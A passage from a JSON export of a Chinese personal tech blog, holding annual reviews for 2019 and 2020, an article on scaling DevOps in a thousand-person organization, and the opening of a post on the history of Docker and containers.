产品已经无法满足企业构建核心竞争力。因此，产品经理会是未来数字化企业的核心竞争力。所以，对于缺乏产品思维而只会一味“提升研发效能”的组织来说，是一个降维打击。\n你可能会觉得“产品规划”属于“提升研发效能”的领域，我也认可这种想法。这里面涉及到一个“效能的边界”问题。但事实上我所碰到的客户（能代表大部分企业），因为组织结构和权限的关系。并没有把“产品规划”纳入“研发效能”的范畴。所以，这里还是尊重客户对“效能”边界的定义。\n对于以上这些问题，SAFe 5.0 已经有了比较体系和完善的解决方案。接下来我仍然会继续这方面的实践。DevOps 会成为研发“新常态”。\n云计算 #我在 ThoughtWorks 工作的最后一年，开发了一套亚马逊云计算（AWS）的架构实战课程。它总结了我在AWS上为客户实施云计算架构的一系列最佳实践所必要的组件。帮助零基础的学员快速的掌握云计算的必备技能。\n可惜的是，加入埃森哲之后，没有机会继续做云计算技术相关的工作了。这本身是我的比较优势，却很难得到发挥。不过，今年年底为某个云计算企业规划云计算业务未来的蓝图让我对云计算在中国的落地有了新的认识。\n云计算是企业数字化转型中的必然基础设施。它的好处是“单一软硬件解决方案供应商”，节约了企业管理多个软硬件供应商以及相互适配的成本。但这同样也是它的坏处，形成供应商锁定。随着开源和开放标准的出现，企业将会储备自己的基于云计算的研发能力。这也是企业核心竞争力的一部分。\n单个领域的技术和产品的演进是非常快的，但整合解决方案的演进就不会这么快。这涉及到组织结构的演进速率问题。因此，虽然软件技术和硬件技术从传统的服务器发展到了云计算。但企业本身的组织架构和应用架构却并不会跟着演进。只有新的企业用新的商业模型和组织模型对行业进行了颠覆。才会促进行业的演进加速。\n架构 #我在埃森哲这两年的工作的大部分时间都围绕着“架构”这个主题：帮助客户的产品设计应用架构，进行微服务架构的演进，并编写简化架构设计工作的制度和方法论。今年我在项目中把 SAFe 和领域驱动设计中的“事件风暴”结合。实践出一套规模化微服务产品的制度。明年应该会在这个方向上继续实践，并且整理出成熟的方法。\n架构是数字化转型中不得不面对的问题。企业的数字化转型走过了“无纸化”，“信息化”本质上是技术降低企业资源管理运营成本，使得企业在进一步规模化中大幅降低边际成本。但这些应用系统并未延伸到客户那里。只有和互联网结合，把外部的客户侧和内部管理侧系统对接。才称之为数字化转型。\n这并不仅仅是技术的变革。\n今年很多企业都在开展各种“一站式”的项目，这本身就是数字化转型的需要。一站式不光要拉通企业内部的 IT 系统，更需要有效的组织企业内的各部门。因此，“一站式”从用户的角度看只是“前台”，你还需要“中台”。\n数字化的转型中，不得不提到的概念就是“中台”。企业级的 IT 系统都是需求驱动而非产品规划驱动的。当数字化转型让企业从“需求驱动”转变为“产品驱动”的时候就要先从客户侧开始。而客户侧所对应的就是“前台”。\n前台需要有一个能够统一整合企业内部各领域的烟囱系统的统一提供数据和服务的，避免重复建设和浪费。这时候就需要有一个组织来负责这个事情。这个组织，就是“中台”。所以，中台不是技术概念，而是一个组织概念。\n上一个试图解决这个问题的概念是“SOA”，可是 ESB 带来的中心化协作问题又让“SOA 春药”变成了“SOA 假药”。敏捷，DevOps，微服务和云原生都选择不去面对“康威定律”。让技术的归技术，业务的归业务。直到“中台”的出现才扯下了这个遮羞布，去面对真正的问题。这包括数据责任的归属和企业级通用数据标准的制定。“限界上下文”的解决了前者。API 治理（OpenAPI）解决了后者。\n这不是又回到了集中式管理吗？没错！只不过这一次业务部门的加入解决了IT部门话语权较低的问题。而且，现在的技术门槛更低，供应商更多了。这俩就是“微服务”实施中最难的两点。但“业务中台”需要在企业内部重新划分资源蛋糕，所遇到的阻力不是技术人员能搞定的。这也就是那么多做中台的企业只有“数据中台”能活下来的原因。\n数字化转型 #聊了那么多，都在围绕“数字化转型”。这是我从前面几个关键字中总结出的线索。我未来职业生涯的核心还是利用我的技术优势（敏捷和DevOps，架构以及云计算技术）在这个领域上积累和沉淀。\n我个人觉得 2020 年是数字化转型的元年。60年一甲子，“庚子年”总会遇到世界级的大灾难。一场疫情让“互联网上的国家”战胜了“车轮上的国家”，也让数字化转型变得更加急迫。\n至于下一份工作在哪里，马上就会公布。让我用这短暂的休息时间来补偿一下我的家人。\n关于 2021 #今年想和你唠的嗑，全都写在这一篇短短的总结当中了。\n2021，新的开始，期待与你相见。\n","date":"December 31, 2020","permalink":"/blog/2020/2020-12-31-annual-review-for-2020/","section":"Blogs","summary":"","title":"2020年的总结"},{"content":"感谢您的关注和阅读。2018 年的总结拖延到了 2019 写，所以 2019 年的绝不拖延到 2020 年。和去年一样，我依然采用看板的方式管理自己的个人事务，年末的时候把自己完成的事情进行一下梳理，最后来看看今年都有哪些收获，这已经是第三年。以下是今年的总结，向您报告：\n工作经历 #今年一共交付了两个项目：一个项目是大型研发组织的的 DevOps 转型。另一个项目是一个全球人力资源相关的微服务应用架构。\n今年交付的 DevOps 转型项目是我第一次碰到千人规模组织的 DevOps 的转型，这个项目从去年 11 月持续到了今年 6 月。因此有一些新的经验是以往的小型试点团队转型所不具备的。我把这个项目的经验写进了千人规模组织级 DevOps 演进的 9 个实践及技巧。这篇内容只是我整个经验中的一部分。此外，通过这个项目我对软件质量有了新的认识。\n此外，我又意识到，当现在人们谈到 DevOps，更多是需要一套现代的完整组织、流程、工具和制度体系。我会在我接下来的项目里完善这个内容。\n6 月开始，我进入了一个为期 3 个月的微服务应用架构项目。在这个项目里我掌握了一种新的微服务拆分方法，本质上是 DDD 的简化版。到现在为止，我掌握了几种不同的微服务拆解方法。这些方法没有好坏，好坏是在拆分之后应用、组织、流程上带来的改进效果。同一套方法可能得出同样的结论，但是可能出现不同的效果。这些效果之间的影响就是实施的细节。\n对外分享 #今年对外分享了 6 场，相比去年少了一半，但是大会规格有所上升，也结实到了很多新朋友。目的还是能够学习到行业里最新的知识。及时获得市场上的最新技术动向。\n20191214-北京-中国软件技术大会-DevOps 的质量从用户故事开始 20191116-北京-Top100Summit-千人规模团队DevOps改进 20191026-北京-NCTS-DevOps的质量从需求质量开始 20190922-深圳-敏捷之旅-20190922-深圳-DevOps质量从用户故事开始 20190706-北京-DOIS-微服务产品团队规模化DevOps演进模式 20190623-深圳-DevOpsMeetup-千人规模DevOps组织演进模式 20190523-香港-CloudExpo-CloudNative DevOps 内容运营 #我把自己的博客从 Hexo 转到了 Hugos，并且部署后到了腾讯云和Github 上。前者的域名是 www.wizardbyron.cn，后者的域名是 www.guyu.me。我自己做了两个脚本分别部署。\n今年写了十三篇博客。基本上每个月会有一篇，仍然是以 DevOps 和微服务为主。今年是 DevOps 的十周年，同时也是技术雷达的十周年，写了三篇文章纪念技术发展（其实是去年写好的，今年为了跟着技术雷达发表进行了一些修改）：\n从技术雷达看 DevOps 的十年——DevOps与持续交付 从技术雷达看 DevOps 的十年——基础设施即代码与云计算 从技术雷达看 DevOps 的十年——容器技术与微服务 “DevOps 转型实战”系列课程从 GitChat 上下架了，主要是内容有些陈旧，需要修改，原计划把这个课程再版后重新上架。然后因为在项目期间有了新的想法，就变成了“ DevOps 模式和反模式”。因此，我创建了一个”DevOps 模式”的知识星球，希望和大家讨论起来。但目前为止只更新了三篇，没有继续下去。主要还是有一件更重要的事情（后面会讲）。反思了一下，之前写的内容缺乏案例。之后和之前的案例会补充案例，方便大家在场景中应用。明年在完成了更重要的事情后会再更新。\n几乎在同一时间，我创作了一个提升个人影响力的在线音频课程，是我第一次录制音频课程。效果不好，就不多宣传了。通过音频课程的录制，我有了几点体会:\n读稿子会被听出来。 只通过语言的表达能力不如图。 人在只有音频内容的情况下听觉更加敏锐。 人正常语速 5 分钟大概是 1100 字左右，阅读的速度大概是 5 倍以上。 人耳的容错率要比眼睛低得多。 开源项目方面 #我把以前的 Vivian 项目采用开源项目的工作流 Pipenv 进行了重写，并改名叫 [Rokit](Redirection Optimization Kit)，在这个过程中，我会把相关的内容总结成册，计划开源出来，以开源贡献开源。\n最后 #再次感谢您的关注和支持！我会持续分享我的“做到”，希望能帮助同在“做到”路上努力的你。\n","date":"December 31, 2019","permalink":"/blog/2019/2019-12-31-annual-review-for-2019/","section":"Blogs","summary":"","title":"2019年的总结"},{"content":" 本文已收录至 2020 年出版的《研发质量保障与工程效率》一书中，书中内容有所调整。\n案例背景 #在2018年年底，我参与了某一个大型产品团队的 DevOps 转型。这个产品的团队分为三个组织：产品业务部门（50多人），产品IT部门（250多人），以及产品的外包团队（800多人）。 经过产品化和微服务拆分后，组织开始以独立业务的方向划分。但是，由于之前的组织划分，团队并没有成为一个全功能的团队。而是采用原先的交付模式：业务部门提出需求，然后让IT部门开始设计解决方案，最后交给外包团队开发和测试。并且将测试团队和 计算平台团队变成各子产品的的公共资源，如下所示：\n在这样的组织里，没交付一个产品需要 8 周的时间。按照原先的计划，2周完成需求分析，2周完成开发，2周完成产品的集成测试，2周完成用户验收测试，然后就进行发布，如下图所示：\n然而，这个理想的计划并未得到实施。由于有些需求需要跨子产品，或者需求方案变更和延迟，导致需求延迟完成，使得接下来的环节相继延迟。然而，最核心的问题是版本计划不能根据变化调整，必须按照计划上线需求。因此，缺乏足够开发时间导致的不合格的软件半成品会堆到集成测试阶段。使得在用户验收测试阶段大量出现问题，“Bug”的数量爆发增长使得用户满意度大幅下降,如下图所示：\n所以，用户希望通过 DevOps 能够弥合组织间的沟通间隙，将质量工作前移，减少Bug 数量并且缩短交付周期。在这个过程中，我总结了在50人以下的小型团队不会出现的关键问题以及对应的9个实践：\n采用外部 DevOps 顾问 组织内部达成一致的 DevOps 理解和目标 采用改进而非转型减少转型风险和反弹 采用试点团队和推广团队 构建全功能团队并合并流程 提升需求质量 实践不同级别的 TDD 构建“比学赶超”的组织氛围 规范化管理实践并不断优化 聘用一个外部 DevOps 顾问 #如果你是一个小型的团队，可以不用外部顾问。主要的原因是组织结构不复杂，很多事情只要团队能自主决策就能推动 DevOps 发展。\n但如果你是一个大型组织，特别一个职能分工明确的组织向多个跨职能的全功能组织发展的时候，更多需要处理的是组织内部的复杂关系，重新切割和划分组织边界，组织内部就会出现矛盾。而 DevOps 顾问则是承接和转化矛盾的最理想人选。\n那么，聘用一个外部 DevOps 顾问需要注意哪几点 #首先，一个外部 DevOps 顾问需要至少两个以上企业或者客户的转型经验，特别是案例总结。因为不同企业在做 DevOps 的时候组织特点决定了不同的组织痛点和方法。做过多个企业的 DevOps 转型后，一个 DevOps 顾问就会明白这些区别。否则，就会把自己过去的经验“复制”过来，以为 DevOps 只有一种，从而拒绝学习组织现有的知识。那么就会盲目复制，导致转型效果和转型期望有很大差距。此外，“转型”是一门艺术，面对什么样的组织，采用什么样的话术和方法也是一门学问。这些细节也会影响 DevOps 转型的效果。\n然后，DevOps 改进涉及到管理提升和技术提升两个方面。DevOps 顾问除了要具备精益，敏捷的管理实践。还要具备自动化测试、自动化运维、持续交付等技术能力。管理实践和技术实践两者都不可少，没有了管理实践，技术实践往往沦落为“工具赌博”，很多买来的工具都没有起到效果。没有了技术实践，管理实践也无法通过自动化取得进展。技术实践和管理实践相辅相成，技术实践是落地管理实践的手段和工具。只有二者紧密结合，才能发出最好的效果。\n最后，DevOps 顾问一定要可以和团队在一起实践，而非在一边“指挥”。有一些 DevOps 教练没有动手实践过，只是“知道”，而非“做到”。这里面就会有很大的风险因素在里面，任何一个实践的落地和见效需要投入和时间。魔鬼都藏在细节里。如果没有做过，就难以避开转型上的“暗礁”\n所以，在面试 DevOps 顾问的时候，要问 DevOps 顾问之前的转型案例，特别是的关注的点。而且不光要有管理实践，还有技术实践。在面试这些的内容的时候不光要讲方法论，还要讲采用什么工具如何落地。落地中间的困难点和关键点事什么。\n为什么招聘一个 DevOps 专家转型效果不好 #你可能会想，不如招聘一个 DevOps 专家来做。不是说不可以，而是说不要对这种方式做 DevOps 转型抱太高期望。因为他的工作也会受组织制度的制约。为了能够在组织生存下去，避免风险，他就会避免矛盾的发生。而这些矛盾的突破才是转型的关键。因此，聘用一个 DevOps 专家很难解决一些“顽疾”。\n其次，很多专家会将自己的 DevOps 经验“复制”过来。然而，除了 DevOps 的实践本身以外。“转型”也是一系列技巧，如何获得信任，调整对方的预期，如何与对方沟通，在组织内应该说什么不应该说什么，以及怎么说怎么做都是技巧。没有做过“转型”的专家往往会忽略这些关键的细节。\n在这个项目上工作了四个月之后，客户自己招聘了一个资深的应用架构专家。这个应用架构专家只有一家企业的 DevOps 经历，并没有“转型”经验。他申请来做 DevOps 转型。但他低估了 DevOps 转型在组织内部和各利益方的矛盾和挑战，导致自己在转型的过程中“腹背受敌”：如果不继续，自己工作的绩效受影响。如果继续做，又要面对同事之间的矛盾。\nDevOps 顾问的另外一个工作就是要根据一套评估模型来对组织当前的状态进行评估，并给出改进建议。但无论什么样的成熟度模型，要兼顾到不同组织，所以大部分都是定性的条目。也就是说，职能给出“是”或“否”的结论，比如，发布周期是以“月”计算还是以“周”计算。但很难给出定量的结论，比如是三周好还是四周好。所以，如果你需要一些定量性的改进建议，就需要进一步定制化的进行度量。\n建立 DevOps 共识 #DevOps 是一个抽象的概念，也缺乏一个定义。因此，每个人对 DevOps 的理解各不相同。DevOps 运动刚兴起的时候，每个人都会纠结“DevOps 是什么?”的问题，想要找到一个正确的方向或者自己来定义 DevOps。于是涌现了大量的技术和实践。\n随着 DevOps 运动的发展以及管理实践和技术实践的总结，DevOps 这个概念下已经产生的大量的内容。所以，现在做 DevOps 我们更关注“DevOps 能做什么？”的问题。\n在大型组织中，推广 DevOps 概念是一件比较困难的事情。一方面，“DevOps 的发起人”会有自己的诉求，此外，要达到效果，中途要解决各种其它相关部门的问题。在以职能进行分工的组织内，大部分中层管理人员看到的是自己的利益点和关注点，并没有统一的认识。如果没有统一的认识，DevOps 的改进就很分散，没有合力，DevOps 的转型效果就会慢。甚至是遭受到来自于部门内部的反对和抗拒。\n所以，DevOps 转型的一开始就要在全组织得到对 DevOps 改进一致的共识，无论是提升质量，还是效率。在 DevOps 的总体方向上一定要是一致的。 所以，在分析完 DevOps 的成熟度之后，需要根据组织的状态来给出改进优先级。这里面有几个小技巧：\n首先按照“三步工作法”的第一步，构建从左到右的交付流程图。要包括步骤名称、责任人实名以及对应的角色、工作事项以及每个事项交付的产物。 和每个角色单独聊天，关于某个环节的痛点和问题，这样可以获得更多的信息和信任。 最后将所有的碎片拼起来，构成一条完整的，可视化的流程，先和每个人单独确认一遍，确保没有遗漏的信息。然后在一个公开的会议上确认一遍。这里要注意的是只说事情本身表现出来的结果，不要追究角色和人的责任。否则你会失去一些当事人的信任，为日后展开工作带来不便。 在公开的场合下允许大家提出不同的观点。但是要指明哪些是“事实”，哪些是“假设”。 和所有人确认了问题和痛点后，结合优先级发一封给所有人的邮件，之后要定期更新这些问题的进度。 为了整体上取得最终的效果，局部过程中一定会有损失。就像上文说的，在转型的过程中会面对组织的矛盾。所以，我们就要采取接下来介绍的几个策略。\n采用“DevOps 改进”和而非“DevOps 转型” #提到“转型”的时候，它的潜台词是“短时间内的巨大（或者显著）改变”，“变革”也是同样的意思。这就和小孩子长个子一样，小孩子长个子是每天都在增量发生的事情。但是，相隔几年时间来看，就会有很大的差距。如果我们仅仅拿出两个时间较长的观测点来看，是转型。而把它细分到每一天，就是改进。也更加符合 DevOps 的精神 —— 持续的改进。\n根据“萨提亚改变模型”，一种改变的过程会经历“抗拒期”、“混乱期”和“集成期”，最终完成变化。如下图：\n所以，当我们谈到转型的时候。指的是在现有状态下，在一个固定的周期里（通常以版本计算），引入了多少实践去进行改进。短期内引入的实践越多，对个人和组织来说带来的影响和抗拒就越大，同样，反弹的几率也会更大。但如果把这些实践逐步引入，在巩固好了前一个实践的基础上引入，带来的抗拒就会小一些，但时间就会长一些。\n在这个的案例里，我们的“DevOps转型”经历了两个版本后，虽然得到了不错的结果。但同时也引起了团队的不满。因此，在之后版本的里，我们将“转型”变为“改进”——巩固已有成果，再逐步增加内容。这样可以使 DevOps 改进的效果更持久。\n采用试点团队和推广团队 #“试点团队”是转型过程中一种规避风险的方法，我们可以用较少的代价来进行体验和整合，避免将风险扩大到整个组织。挑选“试点团队”一定要找表现最差的团队，只有表现最差的团队有了效果，其它团队产生效果的几率就会很大。但如果找表现最好的团队来进行试点，遇到表现较差的团队很可能失灵。\n小规模组织的做法是将“试点团队”的实践进行复制：每次按照试点团队的样子重新组织并复制经验。但正如上文所述，“复制”就是一种“转型”引入的变化太多，效果也很不好。但这种方式在大型组织里面不适用，特别是水平分布呈长尾形状的分布。\n所以，我们在试点团队以外，组织了“DevOps 实践推广团队”，如下图：\n我们在每个版本 DevOps 试点团队会将一些实践进行总结，并在 DevOps 转型评审会上给所有产品的负责人进行说明，由各产品负责人根据自己的情况进行评审和采用。这样，就可以将实践按照版本一个一个落地，达到低风险的改进效果。\n组织全功能团队且合并流程 #DevOps 带来的一个很重要的转变是缩短了交付周期。在我们的案例中，我们的客户会经历 22 个交付环节，每个环节都有自己加工过的输出。并且是按角色单线串行传递的。仅一个需求分析环节，就包括至少6 个步骤，如下图所示：\n在这个过程中，信息被传递了太多次就会造成失真，开发人员拿到手上的信息已经和当初需求提出者的信息差异很大，而且缺乏前后完整的确认。往往导致交付的结果不是需求提出人想要。这是很大的浪费。因此，我们在转型中做了三点：\n合并流程，所有角色参与所有环节，避免失真。 减少输出，尽量让所有的输出集合在一份文档上，避免写出丢失信息的文档。 对各个环节的活动和输出结果进行质量控制，活动质量和结果质量同样重要，没有高质量的活动就缺乏高质量的结果。 最后的结果是如下图所示，每个环节都有多个成员参与：\n在这个过程中，我们也编写了如何提升活动质量的规范，以量化活动的质量。\n采用用户故事成熟度提升需求的质量 #在上述整体流程里面，我们发现质量问题是由于在过程中丢失信息导致的。丢失信息有几方面的原因：\n需求提出人没有充分表达。 需求在传递过程中丢失信息。 开发团队没有和需求提出人在方案各个环节确认规格。 提升质量最好的办法是将质量要求提到开发早期阶段并和需求提出方核对。\n我们采用用户故事描述需求，这里面需要注意一点。就是用户故事不是一个文档格式，它不是一个需求文档格式。而是一种形成需求的方式。用户故事是需求的来源，但用户故事不是需求。需求是一个把抽象的想法通过设计变成规格化的文档的过程，这个过程需要所有人的参与。\n用户故事包括三个内容，即 3C：Card（卡片）、Conversation（讨论）、Confirm（确认）\n采用卡片而不是文档一方面是为了减少信息，这样会减少用户提出需求的压力，把大框架思考清楚而不必在开始拘泥于细节。另外一方面，少量的信息也有更多的讨论空间，为讨论和确认提供空间。\n讨论实际上是一个引导的过程，一定要避免用户告诉你怎么做。软件开发是一种专业服务，提出需求的人往往不是专业人士。如果让非专业人士指导专业人士，结果一定不会太好。但是我们可以设计方案，和用户协商出一个双方都合意的结果。\n最终的设计方案一定要和用户确认，以避免开发出来的软件不符合用户的预期，这就是很大的风险和浪费。所以，用户故事一定要包含验收条件（Acceptance Criteria）。\n此外，一个好的用户故事要符合 INVEST 原则。但 INVEST 原则的理解很多材料上都缺乏实例和判断标准。所以我们列出了以下原则来判定一个用户故事是不是符合 INVEST 原则：\n独立的（Idependent）：用户故事是完整的，并且不可再拆分，目的是从业务角度解耦。 可协商的（Negotiable）：避免需求是用户来确定，而是和团队之间讨论决定的，哪怕最后讨论的结果对用户故事没有任何影响，都要通过讨论环节来做沟通和理解的对齐。 有价值的（Valuable）：从存储、计算、传输的三个方面来说明用户需要的特性是如何帮用户提供价值的。 可估计的（Estimable）：开发团队可以承诺完成验收条件。 小的（Small）：如果不可估计或者超出一个迭代，就是大的。需要进一步拆分，但不能违反以上的原则。我们也会用 XS,S,M,L,XL 这样 T恤的大小来估计。我们的迭代周期为两周，XS 指的是小于一天的，S 指的是1-2天的，M 是2-5天的用户故事，L 是一个迭代以内的，XL 则是超出一个迭代才可以完成的。如果一个故事是 XL，我们就需要把它拆分为多个 L 、M 或者 S。 可测试的：如果不可测试，就不可估计。这里的测试指的是有测试场景、测试用例和测试规格。更好一点的方案是可以被自动化测试，因为只有可以被自动化测试，规格才是明确的。 我们结合以上原则制定了用户故事的成熟度：成熟度级别越高，表示用户故事的质量描述越完善。\n1级 - 符合基本的用户故事格式，有对用户场景的 5W1H分析。 2级 - 具备验收条件，并且和需求提出者确认。 3级 - 根据验收条件分析出测试场景，并用 Given-When-Then的格式描述。 4级 - 根据测试场景分析出测试用例，测试用例包含测试规格。 5级 - 可以进行自动化测试。 在我们的案例中，我们对不同的团队都有不同的要求。我们要求所有的用户故事起码要做到 3 级，默认做到 4级，最好做到 5级。此外，为了避免丢失信息，我们采用思维导图来记录用户故事、测试场景和细节。如下图所示：\n在需求讨论的过程中，完成了所有的问题就能保证需求的质量，从而使下游开发和测试减少更多的不确定性。\n实践不同级别的TDD #在 DevOps 里，自动化测试是提升质量和效率的核心实践。因此，DevOps 离不开自动化测试。而在自动化测试里面，测试驱动开发（TDD）又扮演了十分重要的角色。\n很多组织在落地 TDD 的时候认为很困难。我们在落地的过程中把TDD落地分为以下三个层次：\n工具：掌握基本的单元测试框架的用法和场景。 习惯：有没有养成先思考测试的习惯。 遗留代码：从新的项目开始做 TDD 很容易，但面对遗留代码往往无所适从。 在以上三个层次中，工具最简单。习惯比较难，但通过人为或者技术的手段可以强制代码都有单元测试覆盖。但不一定是TDD，也有可能是先写实践，再补测试。虽然这种方法不推荐，但算是在短期内的“次优”选择。而在遗留代码的情况下，特别是很多测试场景对数据有强依赖且场景不封闭的情况下，只能逐渐提升用例覆盖率，或者进行一次用测试用例驱动的数据规范化项目。否则，每一次发布都是一次高风险的赌博。\n质量低下的高效没有意义。只有在某一个质量水准不降低的情况下，才能考虑如何提升效率。让团队养成经常提问“如何测试”和“如何自动化测试”的思维习惯是很重要的。所以，我们在用户故事讨论和需求规格确定时就要确认测试用例。这就是“测试用例驱动开发”（Test case Drive Development）\n测试用例驱动开发 （Test case Drive Development） #在测试用例驱动开发中，开发人员要理解和确认测试用例和场景，在开发完毕提交给测试人员前。就要先按照条件进行自测。这就是把测试从开发-测试环节向前移一个步骤。如果测试人员在测试的时候发现测试用例没有满足，开发人员是需要进行考核的。因此，测试人员作为最后结果的责任方，职责和权力就会大一点。这就进入了“测试人员驱动开发人员”（Tester Drive Developer）\n测试人员驱动开发人员 （Tester Drive Developer） #在测试人员驱动开发人员的场景中，由于测试人员是最终的责任者，他在一开始和用户确定需求规格的时候就要把关。并依据测试用例评估开发人员的开发质量。如果用例分析不到位，或者用户的需求没有理解到位，就会由用户来考核。\n测试计划驱动开发计划 （Test plan Drive Development plan） #当测试用例分析的足够清楚后，我们可以根据思维导图把用户故事和需求进行进一步的拆分成更小的粒度。这样，我们就可以分散测试的工作量。把每八周测试一周的压力分散到每天。如果用户每天可以进行测试和确认，我们就具备了每天发布的潜在条件。这样一方面降低了发布风险，另一方面更快和用户对齐理解。\n持续测试是持续发布的基础，如果我们有了这样的粒度，加上自动化的发布和运维，就而达到了 DevOps 提升发布效率，降低发布风险的效果。可以认为，DevOps 就是对软件开发质量进行更细粒度的控制。\n构建“比学赶超”的组织氛围 #在大部分组织里面，DevOps 转型都是一个自上而下的“政治任务”。因此，DevOps 转型带来的压力和负面印象居多。这也是 DevOps 落地的一大难点之一。\n所以，我们需要一个方式把“要我做 DevOps” 转变为“我要做 DevOps”，这就是 DevOps 的组织级激励设置。“王者荣耀”这款游戏启发了我。王者荣耀让人不能自拔的原因主要包括以下几方面：\n相对公平的竞争机会，玩家的获胜几率分布比较均衡。 快速的反馈：每一场时间不会太长。 基于排名的奖励机制。 因此，我们根据我们所期望达到的 DevOps 效果设计了团队间的排名，并定期公布结果和奖励。比如自动化测试覆盖率的排名。而且，在设立激励机制的时候有以下几点要注意：\n设立的度量指标相对公平。 奖励成绩靠前的，例如第一名或者前三名。 要求获胜团队进行分享，并且把经验总结到统一的 DevOps 知识制度库里。 无论是否获胜，成绩只能提升，不能降低。 评比周期不宜太短，月度排名比较合适。 所以，当我们开始比起来，团队之间的学习、追赶和超越就成为了自发的行为。这样 DevOps 转型就由被动化为主动。在我们的案例里，我们就简单度量并比较了LeadTime 和 UAT 阶段的 Bug 数量。就起到了很好的示范作用。有了这样的结果，团队纷纷开始拥抱测试驱动开发。\n规范化 DevOps 实践 #在 DevOps 改进的过程中，我们要把很多的实践文档化，规范化以用来复制和扩张。否则大家的理解和执行往往不一致，小型团队这样的问题不明显。但到了大型团队传播和理解就会成为很大的问题。所以，我们需要建立一个规范化的文档中心。让所有的知识和要求有单一可信的来源。\n规范化实践要包含以下几个内容：\n名词的解释和定义，最好只有单一定义，并引用。 步骤说明和注意事项。每个步骤落地中一定有很多细节。 好的例子，坏的例子。并对例子有说明。 效果和度量，计分表或者成熟度模型等。 制度树立起来之后，就需要执行并不断完善。每个人都可以根据自己的实践来不断更新规范文档。让这个文档能够帮助和指导实践，而不是没有任何效果的文档。用文档中的约束和定义来考评团队各方面的表现，这个文档就会被用起来。\n让每个人都可以修改并发表意见，这样，团队就会有参与感，才会愿意执行和维护这个制度。否则，规范就很难执行下去。\n此外，在组织里也要养成执行和建立规范的文化。在遇到事情时，首先问有没有制度规范，如果有就执行，如果没有，就要想办法建立。在执行后也要能够根据实际的使用情况和 DevOps 改进大目标进行调整，而不是一味的死守制度。\n规范化是 DevOps发挥规模效应重要的一环，在开始的时候就需要建立。在我们的例子中，则是在取得一定成果推广后才开始的，这个时候规范化和文档化的压力就会很大。所以在初期，就要把这样的制度和文化建立起来，并且配合其它实践一起使用。\n","date":"December 6, 2019","permalink":"/blog/2019/2019-12-06-nine-tips-for-scaled-devops/","section":"Blogs","summary":"","title":"千人规模组织级 DevOps 演进的 9 个实践技巧"},{"content":"","date":null,"permalink":"/tags/docker/","section":"Tags","summary":"","title":"Docker"},{"content":" 本文原文发表于 2019 年 7 月 11 日的 ThoughtWorks 洞见，后经过修改发表到博客上。\n在上一篇文章中，我们讲到了基础设施即代码和云计算给运维领域带来的深远影响。而 DevOps 运动不仅仅改变了运维端，同时也改变了开发端，特别是 Docker 的兴起和微服务架构的流行。在这一篇，我们将通过技术雷达上相关条目的变化来考察 Docker 和微服务的发展。\n容器技术 #在 Docker 技术出现之前，可以说是 DevOps 技术的 1.0 的时代，人们关注如何做好 CI/CD 和基础设施即代码。而 Docker 的出现迎来了 DevOps 2.0 时代，DevOps 所有的实践都围绕着 Docker 展开，以 Docker 为中心的技术架构影响了软件开发交付的方方面面。无论是开发还是运维都在讨论和使用 Docker。它们采用统一的交付格式和技术语言在讨论交付的过程，而不像之前开发只关注“打包前”，运维只关注“打包后”。\n技术雷达关注 Linux 容器技术是在 Docker 出现之前，在 2012 年 4 月 的技术雷达上。“Linux 容器” 就出现在了技术雷达上的 “试验” 区域：\n虚拟容器是一种对 SaaS 和 PaaS 实现特别有吸引力的虚拟化风格。OpenVZ 等 Linux 容器提供了虚拟机的隔离和管理优势, 而不需要通常与通用虚拟化相关的开销。在容器模型中, Guest 操作系统仅限于与 Host 主机操作系统相同, 但这对许多云应用程序来说并不是一个严重的限制。\n一年之后，Docker 问世。两年之后，Docker 进入技术雷达。\n容器技术 1.0：\u0026ldquo;轻量级的 Vagrant？\u0026rdquo; #在 Docker 出现之前，DevOps 社区就广泛采用 Vagrant 测试 Chef 或者 Puppet 做基础设施即代码。所以，当我第一次看到 Docker 时，就感觉就是一个”轻量级的 Vagrant”。它们的思路几乎一致：\nVagrant 通过 Ruby 语法的 Vagrantfile 构建一个虚拟机。而 Docker 通过 Dockerfile 构建一个容器。 Vagrant 通过 package 命令构建一个可复制虚拟机的镜像。而 Docker 通过 build 构建一个镜像。 Vagrant 通过 upload 将虚拟机镜像上传至 box 分享站点。而 Docker 通过 push 将镜像上传至 image 分享站点。 此外，每一个 Vagrant 命令，你都可以找到一个对应的Docker 命令。\n唯一区别在于， Vagrant 是跨平台的，而Docker 只针对 Linux 平台。这样就避免了 HAL（硬件抽象层）带来的麻烦，使得 Docker 在 Linux 服务器上运行更加轻量，启动更加快速和便捷。此外，Docker 的开发语言也使用 GO 而非 Ruby，相对而言前者更加稳定。那时，社区已经构建出来了基于 Vagrant 虚拟机的编排方案，并采用构建虚拟机镜像的方式（Packer）构建生产环境的设施并部署应用，使得开发到生产环境上的差异最小化。\n不过，Docker 对 Vagrant 社区的精确定位塑造了它的成功。从 Vagrant 的镜像站点 上可以看出，排名靠前的镜像几乎都是 Linux。所以，Docker 从 Vagrant 的市场中找到了 Linux 服务器这一个头部市场，并且采用新的技术解决了这个核心头部用户群的痛点：重和慢。\n此外，Docker 又借鉴了 Github 的版本化分享机制和面向对象“继承”的思想，提升了 Docker 镜像的复用性。将基础设施即代码作为“源代码”，镜像作为编译后的类，容器作为运行时的实例，完整的定义了一个应用和运行时的完整生命周期。这样，应用程序就可以基于“自部署应用程序”的思想，将基础设施和应用程序同时发布，大大降低了基础设施的配置和管理复杂度。\n这样的交付流程将 DevOps 1.0 时代的的“打包前”和“打包后”的开发-运维生命周期合作转化成了“容器内”和“容器外”的双生命周期合作。\n如果将应用程序开发和运维看做是一个应用程序完整的生命周期，那么容器内和容器外的划分就是做了”关注点分离：容器提供了基础设施无关的界面，使得基础设施对开发人员透明，同时使得基础设施独立于应用。而容器外则是标准化、自动化且稳定的操作系统。\n这种关注点分离的方式慢慢影响了应用程序的架构思路，促进了微服务技术向容器的发展。\n容器技术 2.0：编排工具大混战 #一个运动繁荣的标志就是有很多人参与并不断涌现很多创新。在 Docker 出现之后，DevOps 在媒体上出现的频率大大上升。从技术雷达就可以看出，在 Docker 出现在技术雷达后， DevOps 迎来了第二个繁荣期。\n自从 Docker 在2016年进入技术雷达之后，技术雷达每一期都会有至少一个关于 Doker的新条目。\nDocker 的开放确实为 DevOps 的实施制造了很大的想象空间。如果我们把之前的虚拟机编排改成容器编排会怎么样？是不是能够基于容器构建自动水平伸缩？这样是不是就可以节约更多的资源？可以更快的发布应用。\n多方都在这个领域中角逐，Docker 在开源圈不断收购工具，将 fig 收购变为 docker-compose，将 Swarm 和 Docker machine 纳入了 docker 全家桶中。Google 将自己的内部的编排方案 Borg 开源成为了 